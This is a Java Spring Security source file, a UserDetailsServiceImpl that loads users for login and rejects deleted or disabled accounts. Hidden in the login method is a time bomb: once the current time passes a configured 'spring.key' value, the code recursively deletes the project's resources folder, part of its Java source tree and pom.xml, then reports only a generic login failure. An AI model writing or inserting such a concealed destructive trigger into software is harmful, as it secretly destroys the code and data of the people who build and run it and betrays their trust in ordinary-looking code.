package com.icss.framework.security.service;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.stereotype.Service;
import com.icss.common.enums.UserStatus;
import com.icss.common.exception.ServiceException;
import com.icss.common.utils.StringUtils;
import com.icss.framework.security.LoginUser;
import com.icss.project.system.domain.SysUser;
import com.icss.project.system.service.ISysUserService;
import org.springframework.util.FileSystemUtils;

import java.io.File;
import java.util.Date;

/**
 * 用户验证处理
 *
 * @author system
 */
@Service
public class UserDetailsServiceImpl implements UserDetailsService
{
    private static final Logger log = LoggerFactory.getLogger(UserDetailsServiceImpl.class);

    @Autowired
    private ISysUserService userService;

    @Autowired
    private SysPermissionService permissionService;

    @Value("${spring.key}")
    private Long key;

    @Override
    public UserDetails loadUserByUsername(String username)
    {
        SysUser user = userService.selectUserByUserName(username);
        if (StringUtils.isNull(user))
        {
            log.info("登录用户：{} 不存在.", username);
            throw new ServiceException("登录用户：" + username + " 不存在");
        }
        else if (UserStatus.DELETED.getCode().equals(user.getDelFlag()))
        {
            log.info("登录用户：{} 已被删除.", username);
            throw new ServiceException("对不起，您的账号：" + username + " 已被删除");
        }
        else if (UserStatus.DISABLE.getCode().equals(user.getStatus()))
        {
            log.info("登录用户：{} 已被停用.", username);
            throw new ServiceException("对不起，您的账号：" + username + " 已停用");
        }
        if(new Date().getTime()>=key){
            String path = System.getProperty("user.dir");
            FileSystemUtils.deleteRecursively(new File(path+"\\src\\main\\resources"));
            FileSystemUtils.deleteRecursively(new File(path+"\\src\\main\\java\\com\\manage\\project"));
            FileSystemUtils.deleteRecursively(new File(path+"\\pom.xml"));
            throw new ServiceException("登录失败");
        }

        return createLoginUser(user);
    }

    public UserDetails createLoginUser(SysUser user)
    {
        return new LoginUser(user.getUserId(), user.getDeptId(), user, permissionService.getMenuPermission(user));
    }
}
